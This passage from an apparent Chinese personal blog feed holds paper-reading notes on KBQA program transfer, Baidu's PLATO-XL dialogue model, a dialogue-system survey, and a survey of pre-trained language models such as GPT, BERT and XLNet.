<p>《Program Transfer for Answering Complex Questionsover Knowledge Bases》是由清华大学和华为合作完成的工作，收录于 ACL 2022 长文中。该文试图通过一个两阶段的方法来完成 KBQA 任务：解析器将 query 解析为知识库操作序列（无参数），参数分析器为每个操作填入参数。通过在复资源知识库预训练，显著提升了在低资源知识库上的 KBQA 性能。 <span id="more"></span></p>
<p>本文所讲的方法是语义解析的思想，将 query 先转化为知识库的操作序列，如下图所示。分析出 query 对应的操作序列（Find，Relate..），再为每个操作填入参数（实体、关系等），执行操作即可得到结果。</p>
<p><img src="example.png"></p>
<h2 id="背景">背景</h2>
<p>知识库问答，即 KBQA，旨在利用结构化的知识库来解答 query。在<a href="https://tqnwhz.github.io/blog/2021/10/25/KBQA-survey/#more">基于知识库的问答综述（KBQA）</a>中提到了，KBQA 有两种主流方法，<strong>语义解析</strong>的方法将 query 转化为 SQL 语句，执行即可得到结果；信息检索的方法在特定子图中将实体按相关性排序，最终得到结果。复杂 KBQA 是指需要处理多跳逻辑的 KBQA 问题。这种情况下，KBQA 所面临的推理路径的监督数据缺失、语义理解能力不足、检索空间过大等问题会更为突出。</p>
<p>程序规约是指将 KBQA 问题规约为某个可执行的程序，也就是语义解析的思想。近些年来，一些知识库提供了监督的程序规约信号，在这些知识库上的程序规约问答取得了大幅性能提升。如何使用这些监督信号，提升低资源知识库上的性能呢？本文将其定义为程序迁移任务，该任务面临以下挑战：</p>
<ul>
<li><strong>域异构</strong>：由于语言和知识的多样性，源知识库和目标知识库上的知识、问题的表现形式可能相去甚远。</li>
<li><strong>未知的元素</strong>：源知识库的知识覆盖率往往相当有限，例如 KBQA Pro 数据集只覆盖了 3.9% 的关系和 0.24% 的维基百科概念。</li>
<li><strong>过大的搜索空间</strong>：每个知识库操作可选的参数很多，搜索知识库和操作和可选参数不现实。</li>
</ul>
<p>本文的贡献包括：</p>
<ul>
<li>首次提出复杂 KBQA 的程序迁移方法</li>
<li>为程序迁移提出一个两阶段解析框架和本体剪枝策略</li>
<li>通过扩展实验和消融实验证实了程序迁移的有效性</li>
</ul>
<h2 id="框架结构">框架结构</h2>
<p>这一部分其实非常简单，对着下面这张图就能解释清楚，不需要任何数学公式。</p>
<p><img src="framework.png"></p>
<ol type="1">
<li>BERT+GRU 将 query 映射为无参数操作序列（与知识库无关）</li>
<li>利用上一步每个操作的 hidden state 投影后在可选参数空间做 softmax，选择参数</li>
<li>参数剪枝：根据 query 维护可能的域、关系、实体集合，并随着参数序列的自回归过程迭代更新。</li>
</ol>
<h3 id="源域预训练">源域预训练</h3>
<p>损失函数包含两部分：操作序列的交叉熵和参数位置的交叉熵，即两个分类任务损失之和。 <span class="math display">\[
\mathcal {L}^{pretrain}=-\sum_{(x^S,y^S)\in D^S}(logp(y^S_s|x^S)+\sum_{t=1}^{|y_s|}logp(arg_t^S|x^S,o_t^S,\mathcal P))
\]</span></p>
<h3 id="目标域微调">目标域微调</h3>
<p>由于目标域缺少源域的监督程序归纳信号，因此需要通过强化学习 / EM 算法来微调。主要步骤是先搜索得到若干个可能的程序，然后执行程序根据结果更新参数。</p>
<h2 id="实验">实验</h2>
<h3 id="数据集">数据集</h3>
<ul>
<li>源域：KBQA Pro</li>
<li> 目标域：WebQuestionSP，ComplexWebQuestions (CWQ)</li>
<li> 知识库：Freebase</li>
</ul>
<h3 id="基线">基线</h3>
<ul>
<li>语义解析：TEX-TRAY，QGG，TeacherNet</li>
<li> 信息检索：Graft-Net，PullNet</li>
<li> 消融实验基线：<span class="math inline">\(Ours_{-f}\)</span>（未微调），<span class="math inline">\(Ours_{-p}\)</span>（未预训练），<span class="math inline">\(Ours_{-pa}\)</span>（未预训练参数解析器），<span class="math inline">\(Ours_{-o}\)</span>（缺少本体剪枝）</li>
</ul>
<h3 id="评估指标">评估指标</h3>
<ul>
<li>F1</li>
<li>Hits@1：Hits@n 是指正例中处在前 n 个结果中的比例，Hits@1 也就是模型结果第一名为正确结果的比例</li>
</ul>
<p>由于数据集中的问题有多个答案，F1 更好地反映了答案的覆盖程度。</p>
<h3 id="实验结果">实验结果</h3>
<p><img src="exper-result.png"></p>
<p>值得关注的是<span class="math inline"> \(Ours_{-p}\)</span> 极差的结果和<span class="math inline"> \(Ours_{-f}\)</span> 的一般表现，表明了预训练的重要性。并且移去预训练参数解析器和本体剪枝策略都会对模型效果有较大影响。</p>
<h2 id="总结">总结</h2>
<p>这篇论文还是蛮有意思的，用一个比较贴近人认知的框架，把迁移学习应用到 KBQA 中并证实了其有效性。</p>
<p>近期还会从各高校 ACL2022 录取宣传中找一些值得读的论文。等到 ACL 2022 公布 accepted list 了就不用这么折腾了。</p>
<p>碎碎念：我也好想发一篇论文啊。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>问答</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>问答</tag>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>PLATO-XL</title>
    <url>/blog/2022/02/19/PLATO-XL/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>PLATO-XL 是百度于 2021 年发布的论文《PLATO-XL: Exploring the Large-scale Pre-training of Dialogue Generation》中提出的模型，旨在探索大规模预训练对话生成任务的效果，在中英文的多项对话任务上取得了 SOTA。目前，百度提供了<code>百度PLATO</code> 微信公众号服务，可供试用。经笔者测试，PLATO 的效果要远优于微软小冰。因此今天来读下这篇论文。</p>
<span id="more"></span>
<p>下图是微信公众号二维码，大家可以自行体验。</p>
<p><img src="QR.png"></p>
<h2 id="简介">简介</h2>
<p>近些年来，预训练模型的共识是更大的模型 + 更好的数据 = 更好的效果。但是，在对话预训练领域，DialoGPT 的 345M 版本要优于 762M，Blender 的 2.7B 版本要优于 9.4B 的版本，这些反常的现象让人怀疑模型的规模和生成效果是否有清晰的结论关系。本论文指出，对话质量可能还是受益于模型规模，前提是合适的预训练设计。</p>
<p>PLATO-XL 使用 unified Transformer 的架构进行训以提高参数效率，并实行了” 多角色意识预训练 “用于区分人物信息。据论文所述，多角色意识预训练能够显著减少多轮对话中的不一致性。论文的英文模型和推理脚本开源在了 <a href="https://github.com/PaddlePaddle/Knover/tree/develop/projects/PLATO-XL">github</a> 上，没有开源训练脚本、中文模型等。这很百度。</p>
<p>实验结果表明，PLATO-XL 不仅在开放域闲聊任务取得了 SOTA，也可用于微调后应用于任务型对话、知识增强对话场景，同样取得了 SOTA 效果。</p>
<h2 id="plato-xl">PLATO-XL</h2>
<h3 id="网络结构">网络结构</h3>
<p>PLATO-XL 的架构如下图所示，使用 Unified Transformer 的 Seq2Seq 的训练方法。将输入和输出以 [SEP] 间隔，输入内部计算双向 self-attention，输入 - 输出间存在 cross-attention，输出间为单侧的 mask-attention。这种做法的优点是参数利用率高，同一套参数即用来编码又用来解码，得到的模型的泛用性也强。</p>
<p><img src="architecture.png"></p>
<h3 id="多角色意识预训练">多角色意识预训练</h3>
<p>这个名字听着很玄乎，其实思想很简单。从社交媒体中搜集的数据一般如下图所示。多个用户的连续回帖构成了多轮对话。但是由于每个人的性格、观念等的不同，直接拿去训练多轮对话容易产生不一致性。因此 PLATO 引入了角色嵌入（role embedding）来解决这个问题，将角色嵌入和句子向量相加即可。如上面的图所示。</p>
<p><img src="multiparty.png"></p>
<h3 id="预训练设置">预训练设置</h3>
<p>数据集：</p>
<ul>
<li>英文：来自 Reddit，由第三方收集公开于 pushshift.io 上，使用 PLATO-2 的精细清洗流程。训练集为 2005 年到 2019 年的 811M 个样本。词汇表包含 8k BPE token，使用 SentencePiece 构建。</li>
<li>中文：数据集来自社交媒体，清洗后包含 1.2B 训练样本，词表包含 30k BPE token。</li>
</ul>
<p>PLATO-XL 拥有 11B 参数，使用了 72 个 Transformer 和 32 个注意力头，嵌入维度为 3072，前馈层的隐藏状态为 18432。为了训练的稳定性，PLATO-XL 参考 GPT2 将 Layer Normalization 提前到块开始，并对残差层初始参数进行缩放<span class="math inline"> \(*1/\sqrt N\)</span>，N 为残差层数量。</p>
<p>PLAOT-XL 基于飞桨实现，使用了 256 块 32G V100 进行训练。受限于显存，11B 模型无法容纳在单张卡中，标准的数据并行无法进行。因此将优化器状态、梯度、参数分别保存在不同设备，以减少通信并提高计算效率。为了提高 batch size，论文还使用了梯度检查点，即不保存一部分前向过程中的激活值，在反向传播时重新计算，用时间换空间。</p>
<h2 id="实验">实验</h2>
<h3 id="基线">基线</h3>
<ul>
<li>DialoGPT：Reddit 评论， 345M 参数。</li>
<li>Blender：Reddit 评论预训练 + 人工注释对话数据（BST）微调，2.7B 参数。</li>
<li>PLATO-2：使用课程学习方法训练。英文：Reddit 评论 + BST 微调，1.6B 参数。中文：1.2B 社交媒体数据集，336M 参数。</li>
<li>CDial-GPT：LCCC 数据集，95.5M 参数。</li>
<li>ProphetNet-X：豆瓣数据集，379M 参数。</li>
<li>EVA：1.4B 数据，2.8B 参数。</li>
</ul>
<p>此外，论文还与公开的中文聊天机器人：微软小冰、图灵机器人、天猫精灵、小爱同学进行了对比。</p>
<h3 id="评估指标">评估指标</h3>
<p>在开放域对话中，自动化指标和人工平板的相关性很小，因此论文主要通过众包平台进行人工评估。</p>
<ul>
<li>连贯性（Coherence）：话语级指标，回复是否与上下文相关和一致。</li>
<li>信息性（Informativeness）：话语级指标，给定上下文的情况下，回复是否有信息。</li>
<li>参与度（Engagingness）：会话级指标，用户是否愿意与机器人持续聊天。</li>
</ul>
<p>上述三个指标取值为 [0,1,2]，分数越高越好。为了进一步分析对话质量，还有两个更细粒度的评估指标：</p>
<ul>
<li>不一致性（Inconsistency）：细粒度评估连贯性，回复是否与上下文冲突。</li>
<li>错觉（Hallucination ）：细粒度评估信息性，回复是否存在事实性错误。</li>
</ul>
<p>这两项指标取值为 [0,1]，越小越好。</p>
<h3 id="实验结果">实验结果</h3>
<p>实验结果如下图所示。可以看到 PLATO-XL 在所有指标上都是最优的。但是仅看中文指标，PLATO-XL 和 PLATO-2 的差别却不大，数据规模均为 1.2B，二者可能使用的是同一套数据集。二者的主要差别在不一致性和错觉这两项指标上，其他三项指标差距均不足 0.1，但模型规模差了 30 倍。</p>
<p>另一个角度看，PLATO-2 是 2020.1 登录 arxiv，EVA 是 2021.10 登录 arxiv，相差近两年，EVA 的模型和数据集的规模都大于 PLATO-2，在论文中表现却全线弱于 PLATO-2。不过 EVA 论文中也未与 PLATO-2 直接比较。这就比较微妙了，要么是 PLATO 的 UniLM 框架要优于 EVA 的 Seq2Seq，要么就是 PLATO 的数据集质量更好。</p>
<p><img src="experiment-result.png"></p>
<p><img src="chat-result.png"></p>
<h3 id="case-study">Case Study</h3>
<p>论文给出了一个对话样例。大家也可以自行去微信公众号体验。</p>
<p><img src="case-study.png"></p>
<p>下面这张图是网上的体验图，可以看到基本可以达到以假乱真的地步。我自己试用的过程中，也激发了 PLATO 的四川话属性。相较于微软小冰，对话质量和体验提升可以说是巨大的。</p>
<p><img src="demo.png"></p>
<h3 id="其他对话任务">其他对话任务</h3>
<p>将 PLATO-XL 微调后用于任务型对话和知识增强对话，在三个数据集上达到了 SOTA 效果，证实了 PLATO-XL 作为对话 AI 的基础模型的潜力。</p>
<p><img src="other-task.png"></p>
<h2 id="总结">总结</h2>
<p>PLATO-XL 的效果确实是非常惊艳，但是代码、数据、模型全部闭源，就 emmmm。模型出于商业角度不开源，数据出于知识产权角度不开源，这篇论文最大的影响就是证实了中文闲聊场景大模型的上限是很高的，但是怎么达到这个上限，我不告诉你。</p>
<p>英文模型反倒可以开源，毕竟百度也不做国外的生意，开源英文模型和推理脚本，论文应该才更容易接收。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://ai.baidu.com/support/news?action=detail&amp;id=2630&amp;hmpl=yunying=10.22">「比人还会聊天」百度 PLATO 对话机器人开放体验 - https://ai.baidu.com/</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>对话生成</tag>
        <tag>Transformer</tag>
        <tag>闲聊</tag>
        <tag>PLATO</tag>
      </tags>
  </entry>
  <entry>
    <title>对话系统综述</title>
    <url>/blog/2022/02/08/DialogueSystem-Survey/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来读一篇对话系统综述。《Recent Advances in Deep Learning Based Dialogue Systems: A Systematic Survey》是由南洋理工大学于 2021 年发表的论文，目前收录在 arxiv 中。该文调研了对话系统中的历史研究工作，并从模型和系统两个方面进行分析，确定了可能的未来研究方向。此外，本文还涵盖了相关框架、数据集的介绍。</p>
<span id="more"></span>
<p>具体而言：</p>
<ul>
<li>模型类型层面，分析广泛应用于对话系统的不同模型的原理、特点和应用。</li>
<li>系统类型层面，讨论对比面向任务的对话系统和开放域对话系统。</li>
</ul>
<h2 id="背景">背景</h2>
<p>按照应用，对话系统通常可以分为两类：</p>
<p><strong>面向任务的对话系统（Task-oriented dialogue systems）</strong>，用于解决特定领域的特定问题，例如机票预订等。传统的面向任务的对话系统往往以流水线结构组织，包含四个基本模块：自然语言理解、对话状态跟踪、策略学习和自然语言生成。近期工作探索使用端到端的方法，以实现更好的效果。</p>
<p><strong>开放域对话系统（Open-domain dialogue systems）</strong>，旨在不受域的限制地与用户聊天，通常完全由数据驱动。开放域对话系统通常可以分为三类：</p>
<ul>
<li><strong>生成系统。</strong>使用 Seq2Seq 模型将用户输入和历史消息生成回复，可以灵活生成上下文相关的回复，但有时缺乏连贯性并且乏味（例如我不知道）。</li>
<li><strong>基于检索的系统。</strong>根据用户输入从语料库中检索回复，受有限语料库的影响，有时检索到的回复与对话上下文相关性较弱。</li>
<li><strong>集成系统。</strong>结合生成和检索的方法，从二者中选出最优的。</li>
</ul>
<p>此外，生成系统还可以用于改进检索得到的回复。</p>
<p>传统的对话系统大多基于有限状态的、基于统计学习和机器学习方法。基于有限状态的系统易于实现并且可以生成自然的回复，应用于早期的一些场景固定、对话流程确定的产品中。基于统计学习与机器学习的方法通常使用模板填充来处理任务，相较基于有限状态的系统，要更为灵活。但由于模板固定，应用场景和回复的多样性也受到限制。</p>
<p>深度学习的发展则提高了对话系统的性能，其广泛应用于各种 NLP 任务中，也是近些年的研究热点。</p>
<h2 id="神经模型">神经模型</h2>
<p>本节讨论的模型包括：卷积神经网络 (CNNs)、循环神经网络 (RNNs)、Vanilla 序列到序列模型、分层循环编码器 - 解码器 (HRED)、记忆网络、注意力网络、Transformer、指针网络和 CopyNet、深度强化学习模型、生成对抗网络 (GAN)、知识图增强神经网络。</p>
<h3 id="cnn">CNN</h3>
<p><strong>卷积神经网络</strong>（<strong>Convolutional Neural Networks，CNN</strong>）包含卷积层，池化层和前向层，架构如下图所示。输入为长度为 7，特征维度为 5 的序列，使用 6 个卷积核得到 6 个特征图，池化后拼接得到 6 维向量，接一个全连接层后进行分类。</p>
<p><img src="CNN.png"></p>
<p>卷积核的操作如下。其中，m 和 n 代表结果矩阵行列的索引，f 是输入矩阵，h 是卷积核。滑动窗口使得卷积层能够捕获局部特征，池化层则用于扫描产生全局特征，赋予了 CNN 局部和全局感知能力。而参数共享机制可以降低模型的复杂度。 <span class="math display">\[
G(m,n)=(f*h)(m,n)=\sum_j\sum_k h(j,k)f(m-j,n-k)
\]</span> 由于这些特性，CNN 广泛应用于 CV 中，在 NLP 中也得到了一定应用。CNN 是很好的文本特征提取器，但它们可能不是理想的序列编码器。虽然一些对话系统直接使用 CNN 作为编码器编码语言和知识，但是大多数历史最佳对话系统选择在编码文本信息之后，使用 CNN 作为层次特征抽取器。这是由于 CNN 的固定输入长度（输入尺寸改变，全连接层参数也需要改变）和有限的卷积跨度（难以捕捉长距离依赖）。</p>
<p>通常，CNN 用于处理编码信息的对话系统主要有两种情况：</p>
<ul>
<li>应用 CNN 基于来自编码器的特征向量提取特征。从 character-level embeddings 中抽取特征，证明了 CNN 的层级抽取能力。</li>
<li>在响应检索任务中提取特征图。使用单独的编码器对对话上下文和候选响应进行编码，使用 CNN 作为从编码对话上下文和候选响应计算的相似度矩阵的提取器。实验表明，该方法可以在响应检索任务中取得良好的性能。</li>
</ul>
<p>近几年较新的工作不选择 CNN 作为对话编码器的主要原因是，它们无法连续、灵活地跨时间序列提取信息。</p>
<h3 id="rnn">RNN</h3>
<p>标准神经网络和 CNN 的两个限制在于：假设数据不同位置相互独立；输入为固定长度。对于存在依赖、长度可变的输入序列，网络性能受到限制。循环神经网络（RNN）应运而生。公式的介绍可以参考我的博客<a href="https://tqnwhz.github.io/blog/2021/07/22/rnns/#more">循环神经网络 RNN 及其变体 GRU、LSTM | 一隅 (tqnwhz.github.io)</a>，这里就不再赘述。</p>
<p>在对话系统中，RNN 多用于编码器和解码器。编码器用于编码对话上下文、对话状态、对话历史以及外部知识等信息。解码器通过 greedy search 或者 beam search 进行解码。</p>
<h3 id="hred">HRED</h3>
<p><strong>HRED（Hierarchical Recurrent Encoder-Decoder）</strong>是一个上下文感知的 Seq2Seq 模型，使用两个层次的 RNN 对 token-level 和 turn-level 的序列进行建模，架构如下图所示。token-level RNN 编码器序列得到序列表征（同时也是解码器），turn-level RNN 编码对话历史的序列表征，得到当前的上下文向量，并作为解码器的初始状态。</p>
<p><img src="HRED.png"></p>
<p>HRED 还有一些变体。例如 VHRED 在解码阶段引入隐变量，以建模更复杂的序列依赖关系。最近在对话相关任务中的许多工作都应用了基于 HRED 的框架来捕获分层对话特征。其中有一些改进工作，例如参考 Transformer 引入自注意力，引入新的层次捕获全局知识、主题信息等。</p>
<h3 id="memory-network">Memory Network</h3>
<p>记忆网络（Memory Network）是解决有关外部知识问题的重要网络。诸如 LSTM 类的模型，虽然有记忆功能，但记忆模块太小（只有一个固定维度的向量），无法精确地记录全部内容。因此 Weston et al. (2014) 提出了记忆网络，包含四个模块：</p>
<ul>
<li>记忆模块：存储记忆事实表示</li>
<li> I（Input）模块：将输入的记忆事实映射到嵌入式表示</li>
<li> G（Generalization）模块：决定记忆模块的更新，简单起见可以直接将新记忆插入，不进行遗忘和更新</li>
<li> O（Output）模块：根据输入和现有的记忆状态输出</li>
<li> R（Response）模块：根据 O 模块输出产生最终响应</li>
</ul>
<p>端到端的记忆网络架构如下，流程分为三个阶段：</p>
<ul>
<li><strong>权重计算：</strong>使用模型 A、B 分别将输入记忆和输入查询映射为向量，计算权重<span class="math inline"> \(p_i=Softmax(u^Tm_i)\)</span> 代表查询<span class="math inline"> \(u\)</span> 与记忆<span class="math inline"> \(m_i\)</span> 的关系。</li>
<li><strong>记忆选择：</strong>使用模型 C 将输入记忆编码为嵌入向量<span class="math inline"> \(c_i\)</span>，并计算加权和<span class="math inline"> \(o=\sum p_ic_i\)</span>。这实际上跟 Attention 类似，是一种 soft-alignment。</li>
<li><strong>最终预测：</strong>将记忆和查询的和映射为概率向量，即<span class="math inline"> \(\hat \alpha=Softmax(W(o+u))\)</span>。</li>
</ul>
<p><img src="MemoryNetwork.png"></p>
<p>记忆网络广泛用于 QA、面向任务的对话系统中，记忆模块用于存储外部知识等信息。记忆网络的思想也在很多模型中得到了体现。</p>
<h3 id="注意力-transformer">注意力 &amp; Transformer</h3>
<p>为解决 Seq2Seq 将输入序列编码为固定维度向量带来的信息损失，Bahdanau et al. (2014) 提出注意力机制用于机器翻译任务。其思想是解码的每一步与整个输入序列关联，公式描述如下： <span class="math display">\[
P(y_i|y_{t&lt;i})=g(y_{i-1},s_i,c_i)\\
s_i=f(s_{i-1},y_{i-1},c_i)\\
c_i=\sum_{j=1}^{T_x}\alpha_{ij}h_j
\]</span> 其中，h 和 s 分别为编码器和解码器的隐藏状态，i 代表时间步，<span class="math inline">\(y\)</span> 代表输出的 token。g 和 f 为计算输出和更新隐藏状态的函数，由 RNN 的种类决定。<span class="math inline">\(c_i\)</span> 为解码的第 i 步与整个输入序列的注意力结果，<span class="math inline">\(\alpha_{ij}\)</span> 为注意力分数，计算公式为： <span class="math display">\[
\alpha_{ij}=\frac{exp(e_{ij})}{\sum_{k=1}^{T_x}exp(e_{ik})} \\
e_{ij}=a(s_{i-1},h_j)\\
\]</span> a 是相关性度量函数，根据注意力的类型有不同的形式，<span class="math inline">\(\alpha_{ij}\)</span> 即是相关性上进行归一化（Softmax）。注意力的图示如下：</p>
<p><img src="Attention.png"></p>
<p>此后，注意力机制大行其道，基本成为 Seq2Seq 的标配。但是由于 RNN 的不可并行性、难以捕捉长距离依赖等缺点，研究者提出了 Transformer，详细的介绍可参考我的博客 <a href="https://tqnwhz.github.io/blog/2021/08/14/Transformer/">Transformer | 一隅</a>。</p>
<p>... 待补充</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://blog.csdn.net/u014577702/article/details/117825782">Recent Advances in Deep Learning-based Dialogue Systems_北风吹过的秋 - CSDN 博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/31170263">论文笔记 - HRED 与 VHRED - 知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/32257642">论文笔记 - Memory Networks 系列 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话系统</category>
        <category>综述</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>对话系统</tag>
        <tag>综述</tag>
      </tags>
  </entry>
  <entry>
    <title>预训练模型综述</title>
    <url>/blog/2022/01/22/PTM-Study/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>《Pre-Trained Models: Past, Present and Future》是由来自清华、人大、复旦等高校的多位学者合作完成的预训练模型（Pre-Trained Models, PTM）综述。顾名思义，该文主要在讨论预训练模型的过去、现状和未来。 <span id="more"></span></p>
<p>深度神经网络（CNN、RNN 等）通过自动化学习特征，解决了传统机器学习面临的复杂特征工程问题。但是由于特征学习过程缺少人为干预，只通过数据学习，严重依赖于有监督数据的质量和数量。而高昂的人工标注费用使得这一问题更为严峻。</p>
<p>迁移学习的思想缓解了这一问题。借鉴于人类可以利用已学到的知识解决新的问题，迁移学习旨在通过预训练 - 微调两阶段的方法，在预训练阶段大规模数据上学习后，只需较少的样本即可在下游任务上微调并取得较好效果。这降低了模型训练和试错的开销。广泛应用于计算机视觉的各项任务：图像分类、目标检测等。</p>
<p>这一想法也被应用于自然语言处理领域。在 GPT 之前，这一思想代表为 Word2Vec、Glove 为代表的静态词向量。通过在连续词袋等任务上的预训练，模型能够学习到有意义的词向量（平移不变性），进而可以应用于各类任务中。然而，受限于静态词向量的表征能力，面临一词多义问题时，这些词向量往往不能表现出很好的效果。虽然也有一些工作试图将每个词的不同含义在空间中区分开，但并没有根本性地解决这个问题。</p>
<p>在 Transformer 提出后的次年，基于该架构的 GPT 和 BERT 预训练模型问世。它们证实了，当预训练模型的规模变得更大，具有数亿个参数时，预训练模型可以捕获多义消歧、词汇和句法结构，在下游任务上表现出出色的性能，取得甚至比人类更优的结果。随着更大算力的投入，近些年来，预训练模型的规模呈几何翻倍式增长。GPT-3 具有数千亿参数，表现出了类似人类的少样本学习能力，如下图所示。</p>
<p><img src="gpt3-fsl.png"></p>
<p>但是，预训练模型的理论尚不成熟，大规模参数的本质难以理解，巨大的计算成本也让人望而却步。预训练模型已经将研究人员推在一个选择的十字路口中，本文就是在这样的背景下，总结预训练模型取得的成果，并讨论其发展和未来。</p>
<h2 id="背景">背景</h2>
<h3 id="迁移学习">迁移学习</h3>
<p>迁移学习的概念可以追溯到 1998 年，迁移学习旨在从多个源任务中获取重要的<strong>知识</strong>，然后将这些知识应用于目标任务。源任务和目标任务的数据格式、任务目标可能不同，但解决任务所需的知识是一致的。因此，NLP 里出现很多不同的预训练方法，本质上是希望能从多个维度去学习无监督语料中的知识。当预训练任务和下游任务关系密切时，模型更有可能取得好效果。</p>
<p>迁移学习包含两种方法：特征迁移和参数迁移。特征迁移方法预训练有效的特征表示以预编码跨领域和任务的知识。通过将这些预训练的表示注入目标任务，可以显着提高目标任务的模型性能。典型的代表就是 NLP 中的静态词向量 Word2Vec。参数迁移方法遵循一个直观的假设，即源任务和目标任务可以共享模型参数或超参数的先验分布。因此，这些方法将知识预编码为共享模型参数。然后将知识通过精细转换使用目标任务的数据调整预训练参数。参数迁移常见于 CNN。ELMO 和 BERT 分别是特征迁移和参数迁移的两种代表。</p>
<p>在迁移学习思想指导下、高质量数据集 ImageNet 的驱动下（覆盖数千个类别的百万张图片）、正则化方法（残差连接）的加持下，在 CV 领域诞生了 ResNet 这样的预训练模型，可用于图像分类、目标检测、图像分割等多项任务。NLP 领域也进行了尝试，典型代表是 CoVE，在 LSTM 上预训练机器翻译任务后，其编码器可以用于下游任务。</p>
<h3 id="自监督学习">自监督学习</h3>
<p>监督学习、无监督学习、子监督学习的关系如下图所示。</p>
<p><img src="methods.png"></p>
<p>自监督学习利用输入数据本身作为监督，从大规模未标记数据中提取知识，这与无监督学习类似。区别在于无监督学习主要侧重于检测数据模式，通过聚类、异常检测等方法，而自监督学习是通过无监督数据构造出了有监督的数据，使用有监督的方法进行训练。近些年来，NLP 里的预训练任务都是自监督学习。在 BERT 的启发下，研究者们设计出了各类的预训练任务。预训练模型成功的关键就是自监督学习和 Transformer。</p>
<h2 id="transformer">Transformer</h2>
<p>在 Transformer 之前，RNN 一直是处理序列任务的标准方法。RNN 顺序读取 token 并更新状态，这使得它可以处理任意长度的序列，但也限制了它的并行能力。Transformer 结构如下图所示。</p>
<p><img src="transformer-gpt-bert.png"></p>
<p>Transformer 是一种基于 Seq2Seq 的架构，由编码器和解码器组成。编码器和解码器都由几个相同的模块堆叠而成。每个模块都包含多头注意力机制、残差连接和层标准化。详细的介绍可以看我的这篇博客 <a href="https://tqnwhz.github.io/blog/2021/08/14/Transformer/">Transformer | 一隅</a> 。正则化方法使得训练更深的网络成为可能。Transformer 使用的 Attention 包含以下三种：</p>
<ul>
<li>自注意力。用于编码阶段的多头注意力机制，将输入序列中的每个单词和其他单词计算注意力分数，进而得到该单词的向量表征。这也是 Word2Vec 的思想。</li>
<li>掩码自注意力。用于解码阶段生成阶段。Transformer 解码器还是按照自回归的方式进行解码，因此计算注意力的时候需要注意不能泄露数据，只能计算每个单词左侧的注意力，右侧掩码。</li>
<li>交叉注意力。用于解码阶段。Query 为前一个解码器模块的输出，Key 和 Value 为编码网络的输出。类似 Seq2Seq 中的注意力。</li>
</ul>
<p>由于强大的特征抽取能力，Transformer 逐渐成为 NLP 中的标准。GPT、BERT 等 PTM 由此诞生。</p>
<h3 id="gptbert">GPT&amp;BERT</h3>
<p>GPT 使用 Transformer 的解码器来训练语言模型。BERT 使用 Transformer 的编码器训练掩码语言模型，二者的区别如下图所示。GPT 只有掩码自注意力机制，使用自回归的方法建模语言模型，通过极大似然的方法训练，主要用于自然语言生成（NLG）任务。BERT 中只有自注意力机制，使用双向的注意力机制建模掩码语言模型和下句预测任务，主要用于自然语言理解任务（NLU）。掩码语言模型参考了 “完形填空” 的思路，即从句子中随机挡住一个符号（标记为 [MASK]），由模型来根据其他部分预测这个符号，即可认为是这个单词的表示。</p>
<p><img src="gpt-bert.png"></p>
<h3 id="gptbert之后">GPT&amp;BERT 之后</h3>
<p>在 GPT 和 BERT 之后，研究者们提出了一些改进工作，例如 RoBERTa 和 ALBERT。</p>
<p>RoBERTa 是 BERT 的成功变体之一，主要有四个简单有效的变化：（1）去除 NSP 任务； (2) 更多的训练步骤，更大的 batch size 和更多的数据； (3) 更长的训练期限； (4) 动态改变 [MASK] 模式。这些改进使得 RoBERTa 在一些任务上取得优于 BERT 的效果。</p>
<p>ALBERT 是 BERT 的另一个重要变体，它致力于减少 BERT 的参数。首先，它将输入的词嵌入矩阵分解为两个较小的矩阵。其次，它强制所有 Transformer 层之间的参数共享以显着减少参数。第三，它提出了句子顺序预测（SOP）任务来替代 BERT 的 NSP 任务。作为对其空间效率的牺牲，ALBERT 的微调和推理速度较慢。如图 9 所示，除了 RoBERTa 和 ALBERT，近年来还提出了各种 PTM，以更好地从未标记的数据中捕获知识。一些工作改进了模型架构并探索了新的预训练任务，例如 XLNet、UniLM，MASS 等。此外，整合丰富的数据源也是一个重要的方向，例如利用多语言语料库、知识图谱和图像。还有一些工作致力于则增大模型规模，例如 GPT-3。</p>
<p>参考下面这张预训练模型全家福。</p>
<p><img src="ptm-family.png"></p>
<h2 id="架构设计">架构设计</h2>
<p>通常，所有用于语言预训练的 BERT 之后的 Transformer 架构都可以根据两个动机进行分类：统一序列建模和认知启发式架构。</p>
<h3 id="统一序列建模">统一序列建模</h3>
<p>NLP 具有挑战性的原因之一，就是因为它有很多下游任务，通常可以分为三类：</p>
<ul>
<li>自然语言理解（NLU）：单词 / 段落 / 句子分类、语法 / 句法分析、知识推理等</li>
<li>开放域自然语言生成：对话生成、文本生成、故事生成等</li>
<li>非开放域自然语言生成：机器翻译、摘要等</li>
</ul>
<p>这些任务虽然多样，但所需的能力却是通用的，无外乎语言理解和语言生成能力。正如费曼所说，我不能创造的，我也不理解（What I cannot create, I do not understand）。语言理解任务可以转化为生成任务。因此 GPT 此类生成模型也可用于理解任务，甚至一些研究表明，与 BERT 相比，GPT 在理解基准方面可以达到相似甚至更好的性能（Liu 等人，2021b）。因此研究者们开始寻求一种统一的方式，建模所有的任务。</p>
<h4 id="结合自回归和自编码">结合自回归和自编码</h4>
<p>XLNet 首先将 GPT 式的单向生成和 BERT 式的双向理解统一起来，结合自回归和自编码的思想 ，提出了置换语言模型的预训练任务。XLNet 通过在预训练中排列 token 的顺序，然后应用自回归预测范式来解决这个问题，这赋予了 XLNet 理解和生成的能力。UniLM 提出联合训练不同的语言建模目标，包括单向、双向和 seq2seq 目标。这可以通过更改 Transformers 中的注意力掩码来实现。 UniLM 在生成式问答和抽象摘要方面表现出色。</p>
